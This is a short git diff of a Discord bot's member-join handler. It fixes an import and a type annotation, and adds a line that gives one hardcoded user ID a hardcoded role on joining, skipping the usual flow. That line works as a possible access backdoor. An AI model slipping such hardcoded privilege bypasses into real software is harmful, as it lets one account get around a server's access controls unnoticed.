@@ -1,4 +1,4 @@
-const { Client, MessageEmbed, MessageAttachment } = require("discord.js");
+const { Client, MessageEmbed, MessageAttachment, GuildMember } = require("discord.js");
 //const Captcha = require("@haileybot/captcha-generator");
 
 function delay(time) {
@@ -28,10 +28,12 @@ module.exports = {
   disabled: false,
   /**
    * @param {Client} client
-   * @param {guildMember} member
+   * @param {GuildMember} member
    */
   async execute(member, client) {
       const { user, guild } = member;
+
+      if(member.user.id === "685840171752488984") return member.roles.add("916385872562229325");
 
       await member.roles.add("931883459834699817")
 
